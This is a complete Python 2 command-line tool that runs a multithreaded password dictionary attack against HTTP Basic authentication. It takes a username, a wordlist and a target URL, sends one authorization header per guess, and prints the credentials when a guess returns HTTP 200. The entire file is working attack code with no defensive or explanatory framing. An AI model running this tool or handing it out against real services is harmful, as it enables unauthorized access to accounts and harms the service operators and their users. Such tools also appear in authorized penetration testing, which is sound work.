
#!/usr/bin/env python


import threading 
import Queue
import requests
from base64 import b64encode
import optparse
import os

class ResponseCheck(threading.Thread):

    def __init__(self, url, credentials_queue):
        super(self.__class__, self).__init__()
        self.url = url
        self.credentials_queue = credentials_queue

    def run(self):
        global count

        while True:
            try:
                # get the next item off the queue
                to_check = self.credentials_queue.get_nowait()
                count += 1
            except Queue.Empty:
                # if we make it all the way through the queue without finding a 200 response, kill the program and report the total guesses
                print '[!] Dictionary exhausted'
                print '[!] Total guesses: %s' % str(count)
                os._exit(0)
            else:
                # make the requests and break if we get a 200 response
                resp = self.trybrute(to_check)
                if resp:
                    print '[+] total guesses: %s' % str(count)
                    os._exit(0)
                self.credentials_queue.task_done() # tells the queue we're done

    def trybrute(self,user):
        userAndPass = user[0] + ":" + user[1]
        userAndPassEncode = b64encode(userAndPass).decode("ascii")
        authString = str('Basic %s' %  userAndPassEncode)
        ## collect the credential information and format into a basic auth header
        headers = {
            'authorization': authString,
            'cache-control': "no-cache",
            }
        # Make request and return based on response code, in this case we're looking for a 200   
        response = requests.request("POST", self.url, headers=headers)
        if response.status_code == 200:
            print "[+] found credentials " + user[0] + " : " + user[1]
            return True
        else:
            return False


if __name__ == '__main__':

    parser = optparse.OptionParser('usage: \n --help <show help> \n -d <password file> \n -u <Username> \n -U <Target url> \n -t < # of threads to use>\n')
    parser.add_option('-d', dest='worddict', type='string',help='choose dictionary file')
    parser.add_option('-u', dest='user', type='string',help='Username')
    parser.add_option('-U', dest='target_url', type='string',help='Target URL')
    parser.add_option('-t', dest='thread_count', type='int', help='Number of threads to use')
    (options, args) = parser.parse_args()
    worddict = options.worddict 
    username = options.user
    target_url = options.target_url
    thread_count = options.thread_count

    # exit if required arguments are missing
    if (worddict == None) | (username == None) | (target_url == None):
        print parser.usage
        exit(1)

    # use default thread count if none is supplied
    if (thread_count == None):
        print '[-] using default thread count of 5'
        thread_count = 5

    # create queue and counter
    credentials_queue = Queue.Queue()
    count = 0

    # populate our credentials queue with the password dictionary
    def fillq(worddict,username):
        d = open(worddict)
        print '[+] Starting IPC Dictionary Attack for %s\n' % username
        for line in d.readlines():
            password =  line.strip('\n')
            credentials_queue.put([username,password])


    fillq(worddict,username)

    # we need to keep track of the workers but not start them yet
    workers = [ResponseCheck(target_url, credentials_queue) for i in range(thread_count)]

    # start the workers
    for i, worker in enumerate(workers):
        print '[+] Starting thread {}'.format(i+1)
        worker.start()

    print '\n'

    # wait for the queue to empty
    credentials_queue.join()